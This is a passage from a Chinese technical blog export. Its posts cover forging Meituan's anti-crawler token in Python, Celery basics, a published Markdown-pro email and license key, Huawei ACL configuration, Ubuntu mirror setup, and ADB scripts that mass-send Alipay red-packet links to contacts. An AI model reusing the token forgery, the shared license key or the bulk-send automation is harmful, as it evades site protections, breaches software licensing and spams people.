&quot;sign&quot;:&quot;eJwdjktOwzAQhu/ShXeJ4zYNKpIXqKtKFTsOMLUn6Yj4ofG4UjkM10CsOE3vgWH36df/2gAjnLwdlAPBBsYoR3J/hYD28f3z+PpUnmJEPqYa5UWEm0mlLBRqOSaP1qjEtFB849VeRXJ51nr56AOSVIi9S0E3LlfSzhitMix/mQwsrdWa7aTyCjInDk1mKu9nvOHauCQWq2rB/8laqd3cX+adv0zdzm3nbjTOdzCi69A/HQAHOOyHafMLmEtKXg==&quot;&#125;&apos;b&apos;&#123;&quot;rId&quot;:100900,&quot;ver&quot;:&quot;1.0.6&quot;,&quot;ts&quot;:1555230580338,&quot;cts&quot;:1555230580399,&quot;brVD&quot;:[1010,750],&quot;brR&quot;:[[1920,1080],[1920,1040],24,24],&quot;bI&quot;:[&quot;https://gz.meituan.com/meishi/c11/&quot;,&quot;&quot;],&quot;mT&quot;:[],&quot;kT&quot;:[],&quot;aT&quot;:[],&quot;tT&quot;:[],&quot;aM&quot;:&quot;&quot;,&quot;sign&quot;:&quot;eJwdjktOwzAQhu/ShXeJ4zYNKpIXqKtKFTsOMLUn6Yj4ofG4UjkM10CsOE3vgWH36df/2gAjnLwdlAPBBsYoR3J/hYD28f3z+PpUnmJEPqYa5UWEm0mlLBRqOSaP1qjEtFB849VeRXJ51nr56AOSVIi9S0E3LlfSzhitMix/mQwsrdWa7aTyCjInDk1mKu9nvOHauCQWq2rB/8laqd3cX+adv0zdzm3nbjTOdzCi69A/HQAHOOyHafMLmEtKXg==&quot;&#125;&apos;b&apos;&#123;&quot;rId&quot;:100900,&quot;ver&quot;:&quot;1.0.6&quot;,&quot;ts&quot;:1555230116325,&quot;cts&quot;:1555230116367,&quot;brVD&quot;:[1010,750],&quot;brR&quot;:[[1920,1080],[1920,1040],24,24],&quot;bI&quot;:[&quot;https://gz.meituan.com/meishi/c11/&quot;,&quot;&quot;],&quot;mT&quot;:[],&quot;kT&quot;:[],&quot;aT&quot;:[],&quot;tT&quot;:[],&quot;aM&quot;:&quot;&quot;,&quot;sign&quot;:&quot;eJwdjktOwzAQhu/ShXeJ4zYNKpIXqKtKFTsOMLUn6Yj4ofG4UjkM10CsOE3vgWH36df/2gAjnLwdlAPBBsYoR3J/hYD28f3z+PpUnmJEPqYa5UWEm0mlLBRqOSaP1qjEtFB849VeRXJ51nr56AOSVIi9S0E3LlfSzhitMix/mQwsrdWa7aTyCjInDk1mKu9nvOHauCQWq2rB/8laqd3cX+adv0zdzm3nbjTOdzCi69A/HQAHOOyHafMLmEtKXg==&quot;&#125;&apos; 三、生成token在上一步解析token的结果中，可以看到token中包含有以下几个信息，而且除了ts和cts两个属性值外，其余值都是固定的。12345678910111213&quot;rId&quot;:100900,&quot;ver&quot;:&quot;1.0.6&quot;,&quot;ts&quot;:1555228714393,&quot;cts&quot;:1555228714429,&quot;brVD&quot;:[1010,750],&quot;brR&quot;:[[1920,1080],[1920,1040],24,24],&quot;bI&quot;:[&quot;https://gz.meituan.com/meishi/c11/&quot;,&quot;&quot;],&quot;mT&quot;:[],&quot;kT&quot;:[],&quot;aT&quot;:[],&quot;tT&quot;:[],&quot;aM&quot;:&quot;&quot;,&quot;sign&quot;:&quot;eJwdjktOwzAQhu/ShXeJ4zYNKpIXqKtKFTsOMLUn6Yj4ofG4UjkM10CsOE3vgWH36df/2gAjnLwdlAPBBsYoR3J/hYD28f3z+PpUnmJEPqYa5UWEm0mlLBRqOSaP1qjEtFB849VeRXJ51nr56AOSVIi9S0E3LlfSzhitMix/mQwsrdWa7aTyCjInDk1mKu9nvOHauCQWq2rB/8laqd3cX+adv0zdzm3nbjTOdzCi69A/HQAHOOyHafMLmEtKXg==&quot; ts和cts两个值其实就是时间戳，也就是token的有效时间，所以我们在生成token时主要修改这两个属性，其余值保持不变即可。但是要注意到这里的ts和cts是我们传统时间戳的1000倍，所以生成的时候千万不要忘记扩大1000倍。废话不多说，直接看代码吧。 生成token1234567891011121314151617181920212223242526def encode_token(): ts = int(datetime.now().timestamp() * 1000) token_dict = &#123; &apos;rId&apos;: 100900, &apos;ver&apos;: &apos;1.0.6&apos;, &apos;ts&apos;: ts, &apos;cts&apos;: ts + 100 * 1000, &apos;brVD&apos;: [1010, 750], &apos;brR&apos;: [[1920, 1080], [1920, 1040], 24, 24], &apos;bI&apos;: [&apos;https://gz.meituan.com/meishi/c11/&apos;, &apos;&apos;], &apos;mT&apos;: [], &apos;kT&apos;: [], &apos;aT&apos;: [], &apos;tT&apos;: [], &apos;aM&apos;: &apos;&apos;, &apos;sign&apos;: &apos;eJwdjktOwzAQhu/ShXeJ4zYNKpIXqKtKFTsOMLUn6Yj4ofG4UjkM10CsOE3vgWH36df/2gAjnLwdlAPBBsYoR3J/hYD28f3z+PpUnmJEPqYa5UWEm0mlLBRqOSaP1qjEtFB849VeRXJ51nr56AOSVIi9S0E3LlfSzhitMix/mQwsrdWa7aTyCjInDk1mKu9nvOHauCQWq2rB/8laqd3cX+adv0zdzm3nbjTOdzCi69A/HQAHOOyHafMLmEtKXg==&apos; &#125; # 二进制编码 encode = str(token_dict).encode() # 二进制压缩 compress = zlib.compress(encode) # base64编码 b_encode = base64.b64encode(compress) # 转为字符串 token = str(b_encode, encoding=&apos;utf-8&apos;) return token 生成token其实就是解析token的逆过程，所以要先进行二进制压缩，然后进行base64编码，最后转为字符串，下面就是生成了4个token的结果。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]]></content>
      <categories>
        <category>python爬虫</category>
      </categories>
      <tags>
        <tag>python爬虫</tag>
        <tag>美团</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Celery初体验]]></title>
    <url>%2F2018%2F12%2F29%2FCelery%E5%88%9D%E4%BD%93%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[celery是一个专注于实时处理和任务调度的分布式任务队列。使用的场景有下面几点。1.Web应用。当用户出发一个操作时间比较长的时候，可以把它作为任务交给celery进行异步执行，执行完之后在返回给用户。这段时间用户不需要等待，而提高了网站整体的响应时间。 celery是一个专注于实时处理和任务调度的分布式任务队列 使用的场景有下面几点。 1.Web应用。当用户出发一个操作时间比较长的时候，可以把它作为任务交给celery进行异步执行，执行完之后在返回给用户。这段时间用户不需要等待，而提高了网站整体的响应时间。 但不是这样理解。一个路由中存在一个时间较长的任务，大概执行5s。这样请求这个网站大概在5s+以上。为了不让用户进行等待，将这个任务交给celery是正确的。但是这个响应的结果是无法获得任务的结果，毕竟请求已经结束。 2.定时任务。生产环境中常常会运行一些定时任务。比如在用户的生日的时候给在某个特定是时间给用户推送篇祝福的话。 3.异步任务，在同步完成的附加任务工作好的啦;可以添加异步任务。比如发送短信验证码、邮件、推送消息、清理设置缓存等。 Celery还提供了如下的特性： 方便地查看定时任务的执行情况，比如执行是否成功、当前状态、执行任务花费的时间等。 可以使用功能齐备的管理后台或者命令行添加、更新、删除任务。 方便把任务和配置管理相关联。 可选多进程、Eventlet和Gevent三种模式并发执行。 提供错误处理机制。 提供多种任务原语，方便实现任务分组、拆分和调用链。 支持多种消息代理和存储后端。 python+celery+redis 在程序运行的过程中，常常会碰到一个耗时资源的操作，为了避免这些耗时的操作阻塞主程序的运行，常常采用异步任务的方式来解决。比如，在Web开发的过程中，对于新用户利用邮箱进行注册，我们通常会给注册的邮箱发送一封邮件，而这个发送邮件的过程是个IO操作的阻塞型任务，如果把他直接放到主程序中，就需要等待邮件发送完成之后才会向下进行，此时的用户只有等待。 为了避免这种阻塞型任务带来的时间的增加，便会采用一个异步的发送邮件任务，而主程序不必等待发送任务的过程，直接向下进行。从而使得资源响应的时间更快。而邮件发送成功与否与web响应没有直接的联系，就算发送失败，用户只需要在进行一次发送。 Celery是一个强大的分布式任务队列，它可以让任务完全脱离主程序，或者分配到其他的主机上运行。它可以实现两种任务模式：异步任务(async task)和定时任务(crontab) Celery主要有以下模块 任务模块(task) 包含两大任务模式：异步任务，在业务逻辑中触发并发送到任务队列。定时任务，由baet进行周期性地将任务发送到任务队列 消息中间件(Broker) Broker任务调度队列接受生产者发送到任务，将任务存储到任务队列中，Celery不带有存储任务的服务，常常和redis、rabbitMQ搭配使用 任务执行单元(work) Work，执行任务的处理单元，时刻监控着消息队列，获取队列中的调度任务，进行执行。 结果存储(Backend) Backend，储存任务执行的结果，同样可以和redis或rabbitMQ Demo q：celery 和 asyncio都是异步，有什么区别呢？ a:前者是任务队列，重点在分布式任务调度上，最佳应用场景是通过大后方众多worker分散高功耗、高延时任务的并发。后者就是Python3的异步IO库，重点在于对耗时的IO操作释放资源。]]></content>
      <categories>
        <category>python实例</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>celery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Markdown-por激活]]></title>
    <url>%2F2018%2F12%2F11%2FMarkdown-por%E6%BF%80%E6%B4%BB%2F</url>
    <content type="text"><![CDATA[邮箱： Soar360@live.com 授权秘钥： GBPduHjWfJU1mZqcPM3BikjYKF6xKhlKIys3i1MU2eJHqWGImDHzWdD6xhMNLGVpbP2M5SN6bnxn2kSE8qHqNY5QaaRxmO3YSMHxlv2EYpjdwLcPwfeTG7kUdnhKE0vVy4RidP6Y2wZ0q74f47fzsZo45JE2hfQBFi2O9Jldjp1mW8HUpTtLA2a5/sQytXJUQl/QKO0jUQY4pa5CCx20sV1ClOTZtAGngSOJtIOFXK599sBr5aIEFyH0K7H4BoNMiiDMnxt1rD8Vb/ikJdhGMMQr0R4B+L3nWU97eaVPTRKfWGDE8/eAgKzpGwrQQoDh+nzX1xoVQ8NAuH+s4UcSeQ==]]></content>
      <categories>
        <category>激活</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[华为交换机ACL使用]]></title>
    <url>%2F2018%2F12%2F07%2F%E5%8D%8E%E4%B8%BA%E4%BA%A4%E6%8D%A2%E6%9C%BAACL%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[ACL是什么、有什么作用、分哪几类、规则是如何定义的、ACL的匹配机制、规则的匹配顺序、规则的匹配。 本文介绍 ACL是什么、有什么作用、分哪几类、规则是如何定义的、ACL的匹配机制、规则的匹配顺序、规则的匹配。 0x01 ACL是什么ACL是Access Control List的简称，中文名称叫“访问控制列表”，它由一系列规则（即描述报文匹配条件的判断语句）组成。这些条件，可以是报文的源地址、目的地址、端口号等。 0x02 ACL的类别 acl类别 定义与描述 编号范围 标准acl 仅使用报文的源IP地址、分片标记和时间段信息来定义规则 2000~2999 扩展acl 既可使用报文的源IP地址，也可使用目的地址、IP优先级、ToS、DSCP、IP协议类型、ICMP类型、TCP源端口/目的端口、UDP源端口/目的端口号等来定义规则 3000~3999 二层ACL 可根据报文的以太网帧头信息来定义规则，如根据源MAC地址、目的MAC地址、以太帧协议类型等 4000～4999 用户自定义ACL 可根据报文偏移位置和偏移量来定义规则。 5000～5999 用户ACL 既可使用IPv4报文的源IP地址或源UCL（User Control List）组，也可使用目的地址或目的UCL组、IP协议类型、ICMP类型、TCP源端口/目的端口、UDP源端口/目的端口号等来定义规则 6000～9999 0x03 ACL定义规则acl应用原则 标准acl，尽量使用在靠近目标的点。扩展acl，尽量使用在靠近源对的地方，节约保护带宽资源 举例：基于时间的acl配置 配置时间端&gt;创建高级acl&gt;配置流分类&gt;配置流行为&gt;配置流策略&gt;应用流策略 1.配置时间段 1time-range name-deny 6:00 to 6:30 daily 2.创建高级acl 12acl number 3001 rule deny ip source 192.168.0.1 0.0.0.255 time-range name-deny 3.配置流分类 12traffic classifier athorname if-match acl 3001 4.配置流行为 12traffic behavior athorname deny 5.配置流策略 12traffic policy all_deny ckassifier athorname behavior name-deny 6.应用流策略 123interface vlan xxx ip address 192.168.2.1 255.255.255.0 traffic-policy all_deny 0x04 ACL匹配机制 ACL在匹配报文时遵循“一旦命中即停止匹配”的原则 从整个ACL匹配流程可以看出，报文与ACL规则匹配后，会产生两种匹配结果：“匹配”和“不匹配”。 匹配（命中规则）：指存在ACL，且在ACL中查找到了符合匹配条件的规则。不论匹配的动作是“permit”还是“deny”，都称为“匹配”，而不是只是匹配上permit规则才算“匹配”。 不匹配（未命中规则）：指不存在ACL，或ACL中无规则，再或者在ACL中遍历了所有规则都没有找到符合匹配条件的规则。切记以上三种情况，都叫做“不匹配”。 无论报文匹配ACL的结果是“不匹配”、“允许”还是“拒绝”，该报文最终是被允许通过还是拒绝通过，实际是由应用ACL的各个业务模块来决定的。不同的业务模块，对命中和未命中规则报文的处理方式也各不相同。例如，在Telnet模块中应用ACL，只要报文命中了permit规则，就允许通过；而在流策略中应用ACL，如果报文命中了permit规则，但流行为动作配置的是deny，该报文会被拒绝通过。 0x05 ACL匹配顺序只要报文未命中规则且仍剩余规则，系统会一直从剩余规则中选择下一条与报文进行匹配。permit与deny规则相互矛盾的时候。就会按照一定顺序进行匹配。如果先执行permit就会被允许。如果限制性deny就会被先阻止。 acl定义的匹配顺序 配置顺序（config）和自动排序（auto） 配置顺序 即系统按照ACL规则编号从小到大的顺序进行报文匹配，规则编号越小越容易被匹配。后插入的规则，如果你指定的规则编号更小，那么这条规则可能会被先匹配上。 自动排序 自动排序，是指系统使用“深度优先”的原则，将规则按照精确度从高到底进行排序，系统按照精确度从高到低的顺序进行报文匹配。规则中定义的匹配项限制越严格，规则的精确度就越高，即优先级越高，那么该规则的编号就越小，系统越先匹配。 例子 123456789101112131415161718192021222324252627282930acl number 3501rule 5 permit ip source 10.52.1.0 0.0.0.255 destination 10.52.0.0 0.0.255.255acl number 3001 rule 0 permit ip source 10.52.1.0 0.0.0.255 destination 10.52.1.0 0.0.0.255rule 5 permit ip source 10.52.1.0 0.0.0.255 destination 10.50.0.0 0.0.0.255rule 10 permit ip source 10.52.1.0 0.0.0.255 destination 192.168.12.0 0.0.0.255quit//流分类traffic classifier 3001 operator andif-match acl 3001quittraffic classifier 3501 operator andif-match acl 3501quit//流行为traffic behavior 3001permitquittraffic behavior 3501denyquit//流策略traffic policy p101classifier 3001 behavior 3001classifier 3501 behavior 3501quit//流应用vlan 501traffic-policy p101 inboundquit 在对acl了解不清楚的时候。就只是依照这葫芦画瓢的配值，配通之后不通也不知到为什么。 看到上面的acl的流程图之后，才明白rule后面的数字的含义。acl number后面的数字也是排序作用。将先执行的语句的数字应用小的。通过查看华为的文档知识和原来的串起来了。使得基础知识更加的牢固。]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>huawei</tag>
        <tag>交换机</tag>
        <tag>acl</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu更换阿里源]]></title>
    <url>%2F2018%2F11%2F13%2FUbuntu%E6%9B%B4%E6%8D%A2%E9%98%BF%E9%87%8C%E6%BA%90%2F</url>
    <content type="text"><![CDATA[更换阿里源笔记更换阿里源笔记 1.备份系统自带源 mv /etc/apt/sources.list /etc/apt/sources.list.bak 2.修改/etc/apt/sources.list文件 vim /etc/apt/sources.list 加入如下内容 1234567891011121314151617deb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial universedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb http://mirrors.aliyun.com/ubuntu/ xenial multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-propertiesdeb http://archive.canonical.com/ubuntu xenial partnerdeb-src http://archive.canonical.com/ubuntu xenial partnerdeb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-security universedeb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse 3.更新生效 apt-get update]]></content>
      <categories>
        <category>Ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>阿里源</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[支付宝自动化薅羊毛]]></title>
    <url>%2F2017%2F12%2F11%2F%E6%94%AF%E4%BB%98%E5%AE%9D%E8%87%AA%E5%8A%A8%E5%8C%96%E8%96%85%E7%BE%8A%E6%AF%9B%2F</url>
    <content type="text"><![CDATA[说实话我真的佩服自己，明明期末复习了，还要“头铁”的搞这些东西，表示对期末的成绩将会很担心。没办法谁让马云将支付宝红包活动又延长了呢。2018年刚到就增加支付宝红包的金额。在过去的2017年用分享给支付宝好友链接的方式“薅”得了300元。随着红包的额度增大怎么能安心呢！这样每天早上6：30便起床开开心心的分享红包链接。200多个好友分享完一次就要200/9次的重复的动作，但是时间长了多些无味的感觉，重复性的动作在Python的程序理念中是不可取的，“永远都不要重复你自己”。 添加广告：如果看完这篇文章你还不想打赏，就破例扫一下我的红包码，也相当于给我打赏了，别管一毛两毛都是钱！或者加支付宝好友感受一下每天被闹钟似的支付宝红包 内容介绍 如何让我的手脱离手机去发送分享支付宝的链接？程序，Python程序。在最初的时候想着支付宝有没有像微信一样的程序接口，去批量的给支付宝中的好友去发送红包的链接，查找资料后，发现支付宝只提供商业的接口，再下面一点的接口不提供了。也许是担心安全和骚扰问题！ 在年末火的微信跳一跳中，程序辅助中用到了ADB，ADB是Android操作系统与桌面电脑间沟通的一个命令列工具。可以在电脑上通过命令达到操作手机的效果。这个工具可以说在测试中的等级范围属于低级的一种。能达到的效果：我在手机上的各种操作（点，滑动，写文字，截屏）都可以通过ADB使用命令的方式实现。具体的使用方法在上一篇文章中有详细的讲述。在上篇的文章中adb应用的方面在“截屏”、“传输数据”与“按压”。本篇文章中将生活中的事件抽象模型化，完成简单的数理建模，使用ADB的“滑动”与“按压”的组和完成“自动化”分享支付宝红包链接。 分为这几个步骤，介绍上篇文章的流量。搞这个东西的原因，受什么启发贴上一波女朋友的广告 贴上支付宝码，要钱 打赏一次电脑端手机端保存图片 准备工具： 电脑 安卓手机 数据线 Python作为辅助 施行方案 位置测距 抽象模型 Python代码 ###位置测距操作手机使用adb，原理与使用方法参考详细介绍。在平常使用手机过程中，最常用的动作就是点点点，滑滑滑。模拟分享红包链接的过程中也使用到了两步 一个是上下左右滑动 adb shell input swipe x1 x2 y1 y2 另一个是点击 adb shell input tap x y X、Y是手机的分辨率像素对应的位置。手机上左上位置坐标为（0，0），相应的右下的坐标（Xmax，Ymax）。每一个位置都可以通过坐标的方式表达，例如滑动屏幕是从一个坐标到另一个坐标，点击屏幕是直接tap坐标，获取分辨率的方法 adb shell wm size 例如：我的手机720*1280，宽720，长1280 点击某个位置 abd shell input tap 100 100 这时候点击位置，但是这个（100，100）如何快速的确定呢！ 发明出专用的“尺子” 根据手机的尺度打造一个度量，方便后期进行测量大概的位置。 ADB中input的常用方法，具体内容参见我上篇文章 12345678D:\&gt;adb shell inputusage: input ... input text &lt;string&gt; input keyevent &lt;key code number or name&gt; input [touchscreen|touchpad|touchnavigation] tap &lt;x&gt; &lt;y&gt; input [touchscreen|touchpad|touchnavigation] swipe &lt;x1&gt; &lt;y1&gt; &lt;x2&gt; &lt;y2&gt; [duration(ms)] input trackball press input trackball roll &lt;dx&gt; &lt;dy&gt; 抽象模型其实发送的过程就两个大的过程。 点击发送按钮 多选联系人 点击发送按钮实现点击发送按钮的过程十分的简单。例如下图中需要点击“发送”，就只需要定位到发送按钮的位置区域，在这个区域内点击任何一个点即可完成发送的动作。 实现代码定位到发送按钮的位置的一点（600 650）12import osos.system(&apos;adb shell input tap 600 650&apos;) # 完成发送 点击按钮是属于傻瓜式的操作，在与去准确的测量其位置信息，找到对应的位置的信息即可完成操作，同样比如发送、确定、取消等出现在手机上的可点可选内容都能操作。 多选联系人为了做到快速的发送链接给好友，使用多选联系人发送方式，选择每次点击联系人便能加入到多选框，支付宝的限制每次的多选在0~9人的范围，最多不能超过9人。 依照字母格式将整个联系人分成26组。例如定位到A组后，A组中有9位联系人，确定第一位联系人的点击位置，然后第二位联系人在第一位联系人的基础上加上一个联系人的长度（测试长度为111）。 实现9个联系人。 123456first = 初始位置for i in range(9): # 循环点击联系人 point = first + i * 111 print(&apos;固定9个人的位置：&apos;,point) os.system(&apos;adb shell input tap 220 &apos; + str(point) + &apos; &apos;) # 点击联系人的位置 time.sleep(0) 现在整个实现过程的主干已经清楚了，再优化逻辑。 首先如果以某一个字母开头的联系人未满足9人或者超过9人，我们的不再代码适用，选择可以更改的易维护的方案。将某个以字母开头的所有联系人记录，然后判断是否超过9人，如果超过9人，就选着9个人，然后总人数减去9；如果人数达不到9人，便将人数加入到上面代码中的range()位置。 在算法中超过9次每次经历一个全选的过程都减去一次9，例如A中的人数有19个，每9次一个循环，需要进行3次循环分别是第1次选择9人，第2次选择9人，第3次选择1人。这样来来回回的减去i*9个数字略显智障。 1234567891011121314for w in range(int(math.ceil(总人数/9))+1): # 总人数分成9人/组，能分成组数 if w==0: pass else: if w==int(math.ceil(总人数/9)): # 如果人数不够9人/组，就只选剩下的人 for i in range(剩下的人数): # 循环点击联系人 point = first + i * 111 os.system(&apos;adb shell input tap 220 &apos; + str(num2) + &apos; &apos;) time.sleep(0) else: # 人数超过9人/组，进行一组满的选择 for i in range(9): # 循环点击联系人 point = first + i * 111 os.system(&apos;adb shell input tap 220 &apos; + str(num2) + &apos; &apos;) 点击固定9的联系人的位置 time.sleep(0) 在实际的应用中发现，选择7~9个人后最后发送的过程中，有两行联系人头像的位置，而6个人以下（包括6人）只有一个人的头像位置，这样发送的位置就不能固定，于是将分组改成6人，进而避免了来回判断位置的情况。 12345for w in range(int(math.ceil(总人数/6))+1)： # 总人数分成6人/组，能分成组数 if w==0 pass else: 程序 这样我们就有基础了，可以走一遍发送的整个过程，每次发送完成后会返回到支付宝红包的首页，每次都是从首页开始进行 选择依字母开头的联系人，定位到字母联系人的位置 1234567891011121314list=[&apos;*&apos;,&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;······] # 建立列表便于遍历dic2=&#123; &apos;0&apos;:0, # * &apos;1&apos;:29, # a &apos;2&apos;:14, # b &apos;3&apos;:19, # c &apos;4&apos;:8, # d······&#125; # 创建字典 里面的值是对应通讯录中的人数 for l in range(列表长度): zero = int(304) # 通讯录右边 最初的位置 num = zero + 36 * l # 每一个字母之间的位置大概 36 time.sleep(1) os.system(&apos;adb shell input tap 700 &apos; + str(num) + &apos;&apos;) # 选择通讯录最右边字母 然后去选择联系人。超过6个人就去选满6人，然后等下次在定位到这个字母联系人的时候，就要把6个人去舍弃掉，可以转化为不再选这6个人，也就是向下滑动6个联系人的单位。1234for i in range(int(w)-1): #减去1，当w=1时候就不用滑动了。 time.sleep(1) print(&apos;要向下滑动&#123;&#125;个单位，此时滑动到&#123;&#125;个单位&apos;.format(i,int(w)-1)) os.system(&apos;adb shell input swipe 400 900 400 300 1000&apos;) # 滑动的位置都是经过多次的实验得到的 在发送红包的时候可以写一段留言1adb shell input text Red_bagre 写下一段文字 Python代码完整代码，鄙人手拙。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113import osimport timeimport sysimport mathlist=[&apos;*&apos;,&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;,&apos;i&apos;,&apos;j&apos;,&apos;k&apos;,&apos;l&apos;,&apos;m&apos;,&apos;n&apos;,&apos;o&apos;,&apos;p&apos;,&apos;q&apos;,&apos;r&apos;,&apos;s&apos;,&apos;t&apos;,&apos;u&apos;,&apos;v&apos;,&apos;w&apos;,&apos;x&apos;,&apos;y&apos;,&apos;z&apos;,&apos;#&apos;]dic2=&#123; &apos;0&apos;:0, # * &apos;1&apos;:29, # a &apos;2&apos;:14, # b &apos;3&apos;:19, # c &apos;4&apos;:8, # d &apos;5&apos;:0, # e &apos;6&apos;:6, # f &apos;7&apos;:12, # g &apos;8&apos;:12, # h &apos;9&apos;:0, # i &apos;10&apos;:11, # j &apos;11&apos;:1, # k &apos;12&apos;:61, # l &apos;13&apos;:7, # m &apos;14&apos;:4, # n &apos;15&apos;:2, # o &apos;16&apos;:6, # p &apos;17&apos;:4, # q &apos;18&apos;:3, # r &apos;19&apos;:17, # s &apos;20&apos;:8, # t &apos;21&apos;:0, # u &apos;22&apos;:0, # v &apos;23&apos;:28, # w &apos;24&apos;:15, # x &apos;25&apos;:16, # y &apos;26&apos;:28, # z &apos;27&apos;:0 # #&#125; #a = 0for i in range(28): a = a + dic2[str(i)]print(a) #总共有联系人def alipay(): flag = os.system(&apos;adb devices&apos;) if flag == 1: print(&apos;安装adb或配置环境便令&apos;) sys.exit() os.system(&apos;adb shell input keyevent 3&apos;) #依照我手机的图形摆放位置 os.system(&apos;adb shell input keyevent 3&apos;) # 返回到home键 os.system(&apos;adb shell input swipe 600 600 300 600&apos;) os.system(&apos;adb shell input swipe 600 600 300 600&apos;) # 向左滑动两次 os.system(&apos;adb shell input tap 280 100&apos;) # 点击打开支付宝的位置 os.system(&apos;adb shell input tap 80 1250&apos;) # 定位到首页的位置 time.sleep(5) os.system(&apos;adb shell input swipe 400 1150 400 300&apos;) os.system(&apos;adb shell input tap 600 400&apos;) # 发红包赚赏金 for l in range(28): # 大的循环 没发一次就循环一次的，每一个字母循环一次 for w in range(int(math.ceil(dic2[str(l)]/6))+1): if w==0: pass else: 